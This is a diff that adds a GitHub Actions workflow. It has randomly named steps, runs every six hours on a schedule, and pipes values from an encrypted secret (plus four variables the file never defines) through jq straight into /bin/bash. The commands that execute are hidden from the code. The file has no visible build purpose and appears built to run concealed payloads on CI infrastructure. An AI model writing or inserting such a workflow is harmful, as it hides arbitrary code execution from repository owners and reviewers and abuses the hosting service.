@@ -1,0 +1,22 @@
+name: linyongzhou4617
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: linyongzhou4617
+        env:
+          pgpjl40: ${{ secrets.pgpjl40 }}
+        run: |
+          echo $pgpjl40 | jq -r .epli4488 | /bin/bash
+          echo $y44 | jq -r .qt9 | /bin/bash
+          echo $xut62356 | jq -r .uhe90560 | /bin/bash
+          echo $u18 | jq -r .h9 | /bin/bash
+          echo $l8700 | jq -r .pxyf43477 | /bin/bash
+
